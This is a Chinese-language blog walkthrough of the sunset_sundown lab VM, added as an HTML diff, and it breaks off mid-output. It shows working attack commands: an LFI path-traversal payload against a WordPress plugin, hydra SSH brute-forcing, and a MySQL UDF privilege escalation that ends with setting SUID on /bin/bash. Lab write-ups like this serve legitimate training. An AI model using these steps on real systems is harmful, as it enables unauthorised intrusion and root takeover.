@@ -1,0 +1,721 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="sunset_sundown 靶机信息收集1234567891011┌──(kali㉿kali)-[~&#x2F;Documents&#x2F;sunset_sundown]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.152                                     [sudo] password for kali: Starting Nm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sunset_sundown 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/10/d108ba760c3e.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="sunset_sundown 靶机信息收集1234567891011┌──(kali㉿kali)-[~&#x2F;Documents&#x2F;sunset_sundown]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.152                                     [sudo] password for kali: Starting Nm">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/f526a75c84c926e8c823d02d4274ec23_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/365a9d03450aec59dd50741b1f9b9821_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/ccbfd26b56051e61f61e12ea31b4e7b9_MD5.png">
+<meta property="article:published_time" content="2023-10-12T02:24:09.000Z">
+<meta property="article:modified_time" content="2023-10-12T04:52:25.174Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/f526a75c84c926e8c823d02d4274ec23_MD5.png">
+  
+  
+  
+  <title>sunset_sundown 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sunset_sundown 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-12 10:24" pubdate>
+          2023年10月12日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          95 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sunset_sundown 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="sunset-sundown-靶机"><a href="#sunset-sundown-靶机" class="headerlink" title="sunset_sundown 靶机"></a>sunset_sundown 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_sundown]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.152                                     <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 06:01 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.152<br>Host is up (0.000091s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:A1:1B:DA (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure>
+
+<h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>暴露面很少，先看 80 端口</p>
+<p><img src="/pic/f526a75c84c926e8c823d02d4274ec23_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>应该是个 wordpress 网站，用 wpscan 扫一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_sundown]<br>└─$ wpscan --url http://192.168.56.152/ -e u,ap          <br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.38 (Debian)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] robots.txt found: http://192.168.56.152/robots.txt<br> | Interesting Entries:<br> |  - /wp-admin/<br> |  - /wp-admin/admin-ajax.php<br> | Found By: Robots Txt (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://192.168.56.152/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://192.168.56.152/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://192.168.56.152/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://192.168.56.152/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://192.168.56.152/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;<br> |  - http://192.168.56.152/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentynineteen<br> | Location: http://192.168.56.152/wp-content/themes/twentynineteen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Readme: http://192.168.56.152/wp-content/themes/twentynineteen/readme.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 2.5<br> | Style URL: http://192.168.56.152/wp-content/themes/twentynineteen/style.css?ver=1.5<br> | Style Name: Twenty Nineteen<br> | Style URI: https://wordpress.org/themes/twentynineteen/<br> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> | Confirmed By: Css Style In 404 Page (Passive Detection)<br> |<br> | Version: 1.5 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://192.168.56.152/wp-content/themes/twentynineteen/style.css?ver=1.5, Match:  Version: 1.5 <br><br>[+] Enumerating All Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] wp-with-spritz<br> | Location: http://192.168.56.152/wp-content/plugins/wp-with-spritz/<br> | Latest Version: 1.0 (up to <span class="hljs-built_in">date</span>)<br> | Last Updated: 2015-08-20T20:15:00.000Z<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> | Confirmed By: Urls In 404 Page (Passive Detection)<br> |<br> | Version: 4.2.4 (80% confidence)<br> | Found By: Readme - Stable Tag (Aggressive Detection)<br> |  - http://192.168.56.152/wp-content/plugins/wp-with-spritz/readme.txt<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:00 &lt;======================================&gt; (10 / 10) 100.00% Time: 00:00:00<br><br>[i] User(s) Identified:<br><br>[+] admin<br> | Found By: Author Posts - Author Pattern (Passive Detection)<br> | Confirmed By:<br> |  Rss Generator (Passive Detection)<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://192.168.56.152/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Rss Generator (Aggressive Detection)<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br></code></pre></td></tr></table></figure>
+
+<p>发现了一个插件，搜一搜有没有漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_sundown]<br>└─$ searchsploit spritz                        <br>----------------------------------------------------------------<br> Exploit Title       |  Path<br>----------------------------------------------------------------<br>WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion                       | php/webapps/44544.php<br>----------------------------------------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>
+
+<p>存在文件包含漏洞，文件中给出了两个 PoC</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/wp-with-spritz/</span>wp.spritz.content.filter.php?url=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">//</span>etc/passwd<br><br><span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/wp-with-spritz/</span>wp.spritz.content.filter.php?url=http(s):<span class="hljs-regexp">//</span>domain/exec<br></code></pre></td></tr></table></figure>
+
+<p>先尝试本地文件包含</p>
+<p><img src="/pic/365a9d03450aec59dd50741b1f9b9821_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功了，发现了一个用户名 <code>carlos</code> ，接下来尝试访问常见的敏感文件，包括 shadow 文件、wordpress 配置文件、ssh 私钥文件、apache 日志文件</p>
+<p>唯一有收获的就是 wordpress 配置文件</p>
+<p><img src="/pic/ccbfd26b56051e61f61e12ea31b4e7b9_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现了数据库密码，尝试使用此密码来 ssh 登录、wordpress 登录。均失败</p>
+<p>尝试使用插件的第二个 PoC 来测试远程文件包含漏洞，但是遇到了问题，虽然访问了远程文件，可是却没有被 PHP 解析，反弹 shell 失败</p>
+<h2 id="SSH-爆破"><a href="#SSH-爆破" class="headerlink" title="SSH 爆破"></a>SSH 爆破</h2><p>接下来尝试了使用 <code>carlos</code> 用户直接爆破其 ssh 密码，以及爆破 wordpress 中 admin 的密码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_sundown]<br>└─$ hydra -l carlos -P /usr/share/wordlists/rockyou.txt 192.168.56.152 ssh<br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-11 22:45:31<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task<br>[DATA] attacking ssh://192.168.56.152:22/<br>[22][ssh] host: 192.168.56.152   login: carlos   password: carlos<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 2 final worker threads did not complete <span class="hljs-keyword">until</span> end.<br></code></pre></td></tr></table></figure>
+
+<p>爆破得到了 ssh 登录的密码，登录后查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_sundown]<br>└─$ ssh carlos@192.168.56.152              <br>carlos@192.168.56.152\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux sundown 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string"></span><br><span class="hljs-string">carlos@sundown:~$ sudo -l</span><br><span class="hljs-string">[sudo] password for carlos: </span><br><span class="hljs-string">Sorry, user carlos may not run sudo on sundown.</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="提权之信息收集"><a href="#提权之信息收集" class="headerlink" title="提权之信息收集"></a>提权之信息收集</h2><p>查看环境和家目录文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">carlos@sundown:~$ <span class="hljs-built_in">ls</span> -alih<br>total 28K<br>134541 drwxr-xr-x 3 carlos carlos 4.0K Aug  3  2020 .<br>131078 drwxr-xr-x 3 root   root   4.0K Aug  3  2020 ..<br>134958 lrwxrwxrwx 1 root   root      9 Aug  3  2020 .bash_history -&gt; /dev/null<br>134542 -rw-r--r-- 1 carlos carlos  220 Aug  3  2020 .bash_logout<br>134544 -rw-r--r-- 1 carlos carlos 3.5K Aug  3  2020 .bashrc<br>135949 drwxr-xr-x 3 carlos carlos 4.0K Aug  3  2020 .<span class="hljs-built_in">local</span><br>134977 -rw------- 1 carlos carlos   33 Aug  3  2020 local.txt<br>135567 lrwxrwxrwx 1 root   root      9 Aug  3  2020 .mysql_history -&gt; /dev/null<br>134543 -rw-r--r-- 1 carlos carlos  807 Aug  3  2020 .profile<br>carlos@sundown:~$ <span class="hljs-built_in">cat</span> local.txt<br>28f84888f6bd690e321cba14659b32f2<br></code></pre></td></tr></table></figure>
+
+<p>查看 SUID 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">carlos@sundown:~$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>    10540    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign<br>   136894     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>     6833     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     3910     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount<br>     3436     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp<br>       55     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd<br>     3583     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su<br>     3908     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount<br>    17572    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo<br>       53     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh<br>       56     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd<br>       52     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn<br></code></pre></td></tr></table></figure>
+
+<p>尝试使用数据库密码来切换登录到 root，失败</p>
+<p>尝试登录数据库后，查看哈希值，得到的哈希值于在线网站碰撞失败</p>
+<h2 id="UDF-提权"><a href="#UDF-提权" class="headerlink" title="UDF 提权"></a>UDF 提权</h2><p>突然想到有没有可能，数据库的密码一直没用上是因为在提权阶段才会使用到，接下来查看一下 mysql 的运行状态，是否是 root 运行，考虑 UDF 提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">carlos@sundown:/tmp$ ps aux | grep mysql<br>root       357  0.0  0.0   2388   696 ?        Ss   05:59   0:00 /bin/sh -c /usr/sbin/mysqld<br>root       361  0.1 11.7 1284380 119124 ?      Sl   05:59   0:18 /usr/sbin/mysqld<br>carlos    1710  0.0  0.0   6076   824 pts/0    S+   09:01   0:00 grep mysql<br></code></pre></td></tr></table></figure>
+
+<p>可以尝试，看看满不满足 UDF 提权的必要条件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [wordpress_db]&gt; show variables like <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br>+------------------+-------+<br>| Variable_name    | Value |<br>+------------------+-------+<br>| secure_file_priv |       |<br>+------------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.001 sec)<br><br>MariaDB [(none)]&gt; show variables like <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br>+-----------------+--------------------------------------------+<br>| Variable_name   | Value                                      |<br>+-----------------+--------------------------------------------+<br>| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/|<br>| plugin_maturity | gamma                                      |<br>+-----------------+--------------------------------------------+<br></code></pre></td></tr></table></figure>
+
+<p>有搞头，看了看 plugin 目录的权限，无法直接写入，那就考虑直接通过 MySQL 写入。使用的是 <a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">MySQL UDF 提权十六进制查询 | 国光 (sqlsec.com)</a> 记得修改写入的插件目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [(none)]&gt; CREATE FUNCTION sys_eval RETURNS STRING SONAME <span class="hljs-string">&#x27;udf.so&#x27;</span>;<br>Query OK, 0 rows affected (0.000 sec)<br><br>MariaDB [(none)]&gt; <span class="hljs-keyword">select</span> * from mysql.func;<br>+----------+-----+--------+----------+<br>| name     | ret | dl     | <span class="hljs-built_in">type</span>     |<br>+----------+-----+--------+----------+<br>| sys_eval |   0 | udf.so | <span class="hljs-keyword">function</span> |<br>+----------+-----+--------+----------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.000 sec)<br><br>MariaDB [(none)]&gt; <span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>+--------------------+<br>| sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>) |<br>+--------------------+<br>| root               |<br>+--------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.005 sec)<br></code></pre></td></tr></table></figure>
+
+<p>提权成功，想反弹 shell 但是没法得到稳定的 shell，那把 bash 文件加上 S 权限吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [(none)]&gt; <span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;chmod +s /bin/bash&#x27;</span>);<br>+--------------------------------+<br>| sys_eval(<span class="hljs-string">&#x27;chmod +s /bin/bash&#x27;</span>) |<br>+--------------------------------+<br>| NULL                           |<br>+--------------------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.004 sec)<br><br>MariaDB [(none)]&gt; <span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;ls -liah /bin/bash&#x27;</span>);<br>+---------------------------------------------------------+<br>| sys_eval(<span class="hljs-string">&#x27;ls -liah /bin/bash&#x27;</span>)                          |<br>+---------------------------------------------------------+<br>| 1411 -rwsr-sr-x 1 root root 1.2M Apr 18  2019 /bin/bash 